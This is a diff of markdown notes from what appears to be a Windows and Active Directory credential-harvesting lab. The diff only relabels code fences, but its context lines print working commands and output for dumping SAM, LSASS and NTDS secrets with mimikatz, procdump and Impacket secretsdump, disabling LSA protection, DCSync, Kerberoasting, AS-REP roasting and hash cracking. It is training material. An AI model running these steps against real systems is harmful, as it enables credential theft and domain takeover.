@@ -134,7 +134,7 @@ The following are some of the types of clear-text files that an attacker may be 
 It might be worth checking what users are working on or finding sensitive information. Another example would be finding interesting information. For example, the following command is to look for the "password" keyword in the Window registry.
 
     Searching for the "password" keyword in the Registry  
-```Searching for the "password" keyword in the Registry 
+```bash
 c:\Users\user> reg query HKLM /f password /t REG_SZ /s
 #OR
 C:\Users\user> reg query HKCU /f password /t REG_SZ /s
@@ -219,7 +219,7 @@ The SAM is a Microsoft Windows database that contains local account information 
 First, ensure you have deployed the provided VM and then confirm we are not able to copy or read the `c:\Windows\System32\config\sam` file:
 
    Confirming No Access to the SAM Database  
-```Confirming No Access to the SAM Database 
+```bash
 C:\Windows\system32>type c:\Windows\System32\config\sam
 type c:\Windows\System32\config\sam
 The process cannot access the file because it is being used by another process.
@@ -239,7 +239,7 @@ The first method is using the built-in Metasploit Framework feature, hashdump, t
  
 
     Dumping the SAM database content  
-```Dumping the SAM database content 
+```bash
 meterpreter > getuid
 Server username: THM\Administrator
 meterpreter > hashdump
@@ -265,7 +265,7 @@ More specifically, we will be using wmic to create a shadow volume copy. This ha
 Now let's apply what we discussed above and run the cmd.exe with administrator privileges. Then execute the following wmic command:
 
    Creating a Shadow Copy of Volume C with WMIC 
-```Creating a Shadow Copy of Volume C with WMIC 
+```bash
 C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
 Executing (Win32_ShadowCopy)->create()
 Method execution successful.
@@ -284,7 +284,7 @@ instance of __PARAMETERS
  
 
   Listing the Available Shadow Volumes 
-```Listing the Available Shadow Volumes 
+```bash
 C:\Users\Administrator>vssadmin list shadows
 vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
 (C) Copyright 2001-2013 Microsoft Corp.
@@ -312,7 +312,7 @@ Now let's copy both files (sam and system) from the shadow copy volume we genera
  
 
    Copying the SAM and SYSTEM file from the Shadow Volume 
-```Copying the SAM and SYSTEM file from the Shadow Volume 
+```bash
 C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
         1 file(s) copied.
 
@@ -329,7 +329,7 @@ Registry Hives
 Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. Luckily, we can save the value of the Windows registry using the reg.exe tool. As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.
 
    Save SAM and SYSTEM files from the registry 
-```Save SAM and SYSTEM files from the registry 
+```bash
 C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
 The operation completed successfully.
 
@@ -348,7 +348,7 @@ Move both SAM and system files to the AttackBox and run the following command:
  
 
    Decrypting SAM Database using Impacket SecretsDump Script Locally 
-```Decrypting SAM Database using Impacket SecretsDump Script Locally 
+```bash
 user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
 Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 
@@ -404,7 +404,7 @@ Once the dumping process is finished, a pop-up message will show containing the 
  
 
    Copying the LSASS Dumped file 
-```Copying the LSASS Dumped file 
+```bash
 C:\Users\Administrator>copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
         1 file(s) copied.
 ```
@@ -420,7 +420,7 @@ We can specify a running process, which in our case is lsass.exe, to be dumped a
  
 
    Dumping the LSASS Process using procdump.exe  
-```Dumping the LSASS Process using procdump.exe 
+```bash
 c:\>c:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump
 
 ProcDump v10.0 - Sysinternals process dump utility
@@ -444,7 +444,7 @@ We will be using the `Mimikatz` tool to extract the memory dump of the lsass.exe
 Remember that the LSASS process is running as a SYSTEM. Thus in order to access users' hashes, we need a system or local administrator permissions. Thus, open the command prompt and run it as administrator. Then, execute the mimikatz binary as follows,
 
    Runing mimikatz With Admin Privielges 
-```Runing mimikatz With Admin Privielges 
+```bash
 C:\Tools\Mimikatz> mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
@@ -464,7 +464,7 @@ mimikatz #
  
 
    Checking the Current Permission to Access Memory  
-```Checking the Current Permission to Access Memory 
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
@@ -476,7 +476,7 @@ Privilege '20' OK
  
 
    Dumping the Stored Clear-text Passwords 
-```Dumping the Stored Clear-text Passwords 
+```bash
 mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 515377 (00000000:0007dd31)
@@ -509,7 +509,7 @@ In 2012, Microsoft implemented an LSA protection, to keep LSASS from being acces
 The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
 
    Failing to Dump Stored Password Due to the LSA Protection 
-```Failing to Dump Stored Password Due to the LSA Protection 
+```bash
 mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 ```
@@ -517,7 +517,7 @@ ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
   The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,
 
    Loading the mimidrv Driver into Memory 
-```Loading the mimidrv Driver into Memory 
+```bash
 mimikatz # !+
 [*] 'mimidrv' service not present
 [+] 'mimidrv' service successfully registered
@@ -534,7 +534,7 @@ Once the driver is loaded, we can disable the LSA protection by executing the fo
  
 
    Removing the LSA Protection 
-```Removing the LSA Protection 
+```bash
 mimikatz # !processprotect /process:lsass.exe /remove
 Process : lsass.exe
 PID 528 -> 00/00 [0-0-0]
@@ -584,7 +584,7 @@ We can access the Windows Credential Manager through GUI (Control Panel -> User 
 We will be using the Microsoft Credentials Manager `vaultcmd` utility. Let's start to enumerate if there are any stored credentials. First, we list the current windows vaults available in the Windows target.
 
    Listing the Available Credentials from the Credentials Manager 
-```Listing the Available Credentials from the Credentials Manager 
+```bash
 C:\Users\Administrator>vaultcmd /list
 Currently loaded vaults:
         Vault: Web Credentials
@@ -605,7 +605,7 @@ Let's check if there are any stored credentials in the Web Credentials vault by 
  
 
   Checking if there Are any Stored Credentials in the "Web Credentials." 
-```Checking if there Are any Stored Credentials in the "Web Credentials." 
+```bash
 C:\Users\Administrator>VaultCmd /listproperties:"Web Credentials"
 Vault Properties: Web Credentials
 Location: C:\Users\Administrator\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
@@ -618,7 +618,7 @@ Current protection method: DPAPI
  The output shows that we have one stored credential in the specified vault. Now let's try to list more information about the stored credential as follows,
 
    Listing Credentials Details for "Web Credentials" 
-```Listing Credentials Details for "Web Credentials" 
+```bash
 C:\Users\Administrator>VaultCmd /listcreds:"Web Credentials"
 Credentials in vault: Web Credentials
 
@@ -638,7 +638,7 @@ The VaultCmd is not able to show the password, but we can rely on other PowerShe
 Ensure to execute PowerShell with bypass policy to import it as a module as follows,
 
    Getting Clean-text Password from Web Credentials 
-```Getting Clean-text Password from Web Credentials 
+```bash
 C:\Users\Administrator>powershell -ex bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -662,7 +662,7 @@ An alternative method of taking advantage of stored credentials is by using RunA
 Let's apply it to the attached Windows machine. Another way to enumerate stored credentials is by using `cmdkey`, which is a tool to create, delete, and display stored Windows credentials. By providing the `/list` argument, we can show all stored credentials, or we can specify the credential to display more details `/list:computername`.
 
    Enumerating for Stored Windows Credentials 
-```Enumerating for Stored Windows Credentials 
+```bash
 C:\Users\thm>cmdkey /list
 
 Currently stored credentials:
@@ -675,7 +675,7 @@ Currently stored credentials:
   The output shows that we have a domain password stored as the `thm\thm-local` user. Note that stored credentials could be for other servers too. Now let's use runas to execute Windows applications as the `thm-local` user. 
 
    Run CMD.exe As a User with the /savecred argument 
-```Run CMD.exe As a User with the /savecred argument 
+```bash
 C:\Users\thm>runas /savecred /user:THM.red\thm-local cmd.exe
 Attempting to start cmd.exe as user "THM.red\thm-local" ...
 ```
@@ -687,7 +687,7 @@ Mimikatz
 Mimikatz is a tool that can dump clear-text passwords stored in the Credential Manager from memory. The steps are similar to those shown in the previous section (Memory dump), but we can specify to show the credentials manager section only this time.
 
   Dumping Memory for Credentials Manager 
-```Dumping Memory for Credentials Manager 
+```bash
 C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
@@ -769,7 +769,7 @@ To successfully dump the content of the NTDS file we need the following files:
 The following is a one-liner PowerShell command to dump the NTDS file using the Ntdsutil tool in the `C:\temp` directory.
 
    Dumping the content of the NTDS file from the Victim Machine 
-```Dumping the content of the NTDS file from the Victim Machine 
+```bash
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 ```
 
@@ -778,7 +778,7 @@ powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the AttackBox and run the secretsdump.py script to extract the hashes from the dumped memory file.
 
    Extract hashes from NTDS Locally 
-```Extract hashes from NTDS Locally 
+```bash
 user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
 ```
 
@@ -801,7 +801,7 @@ An adversary takes advantage of these configurations to perform domain replicati
 The Persisting AD room uses the Mimikatz tool to perform the DC Synchronisation attack. Let's demonstrate the attack using a different tool, such as the Impacket SecretsDump script.
 
    Performing the DC Sync Attack 
-```Performing the DC Sync Attack 
+```bash
 user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP 
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
@@ -824,7 +824,7 @@ thm.red\thm:1114:aad3b435b51404eeaad3b435b51404ee:[****REMOVED****]:::
 Note if we are interested to dump only the NTLM hashes, then we can use the `-just-dc-ntlm` argument as follows,
 
    The DC Sync Attack to Dump NTLM Hashes 
-```The DC Sync Attack to Dump NTLM Hashes 
+```bash
 user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP
 ```
 
@@ -835,7 +835,7 @@ user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.
  
 
    Cracking the Hashes 
-```Cracking the Hashes 
+```bash
 user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
 ```
 
@@ -880,7 +880,7 @@ The new method includes two new attributes (ms-mcs-AdmPwd and ms-mcs-AdmPwdExpir
  The provided VM has the LAPS enabled, so let's start enumerating it. First, we check if LAPS is installed in the target machine, which can be done by checking the `admpwd.dll` path.
 
     Enumerating for LAPS  
-```Enumerating for LAPS 
+```bash
 C:\Users\thm>dir "C:\Program Files\LAPS\CSE"
  Volume in drive C has no label.
  Volume Serial Number is A8A4-C362
@@ -901,7 +901,7 @@ The output confirms that we have LAPS on the machine. Let's check the available 
  
 
    Listing the available PowerShell cmdlets for LAPS  
-```Listing the available PowerShell cmdlets for LAPS 
+```bash
 PS C:\Users\thm> Get-Command *AdmPwd*
 
 CommandType     Name                                               Version    Source
@@ -921,7 +921,7 @@ Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    Ad
 Next, we need to find which AD organizational unit (OU) has the "All extended rights" attribute that deals with LAPS. We will be using the "Find-AdmPwdExtendedRights" cmdlet to provide the right OU. Note that getting the available OUs could be done in the enumeration step. Our OU target in this example is `THMorg`. You can use the `-Identity *` argument to list all available OUs.
 
    Finding Users with AdmPwdExtendedRights Attribute  
-```Finding Users with AdmPwdExtendedRights Attribute 
+```bash
 PS C:\Users\thm> Find-AdmPwdExtendedRights -Identity THMorg
 
 ObjectDN                                      ExtendedRightHolders
@@ -934,7 +934,7 @@ OU=THMorg,DC=thm,DC=red                       {THM\THMGroupReader}
 The output shows that the `THMGroupReader` group in `THMorg` has the right access to LAPS. Let's check the group and its members.
 
    Finding Users belong to THMGroupReader Group  
-```Finding Users belong to THMGroupReader Group 
+```bash
 PS C:\Users\thm> net groups "THMGroupReader"
 Group name     THMGroupReader
 Comment
@@ -971,7 +971,7 @@ We found that the `bk-admin` user is a member of `THMGroupReader`, so in order t
  
 
    Getting LAPS Password with the Right User  
-```Getting LAPS Password with the Right User 
+```bash
 PS C:\> Get-AdmPwdPassword -ComputerName creds-harvestin
 
 ComputerName         DistinguishedName                             Password           ExpirationTimestamp
@@ -1018,7 +1018,7 @@ Kerberoasting is a common AD attack to obtain AD tickets that helps with persist
 Let's do a quick demo about the attack. First, we need to find an SPN account(s), and then we can send a request to get a TGS ticket. We will perform the Kerberoasting attack from the AttackBox using the GetUserSPNs.py python script. Remember to use the THM.red/thm account with Passw0rd! as a password.
 
    Enumerating for SPN Accounts 
-```Enumerating for SPN Accounts 
+```bash
 user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -1033,7 +1033,7 @@ http/creds-harvestin.thm.red  svc-user            2022-06-04 00:15:18.413578
 The output revealed that we have an SPN account, svc-user. Once we find the SPN user, we can send a single request to get a TGS ticket for the srv-user user using the -request-user argument.
 
    Requesting a TGS Ticket as SPN Account  
-```Requesting a TGS Ticket as SPN Account 
+```bash
 user@machine$ python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -1051,7 +1051,7 @@ $krb5tgs$23$*svc-user$THM.RED$THM.red/svc-user*$8f5de4211da1cd5715217[*REMOVED*]
  Now, it is a matter of cracking the obtained TGS ticket using the HashCat tool using `-m 13100` mode as follows,
 
    Cracking the TGS Ticket using Hashcat  
-```Cracking the TGS Ticket using Hashcat 
+```bash
 user@machine$ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
 ```
 
@@ -1080,7 +1080,7 @@ CREDS-HARVESTIN$
 We will be using the Impacket Get-NPUsers script this time as follows,
 
    Performing an AS-REP Roasting Attack against Users List  
-```Performing an AS-REP Roasting Attack against Users List 
+```bash
 root@machine$ python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
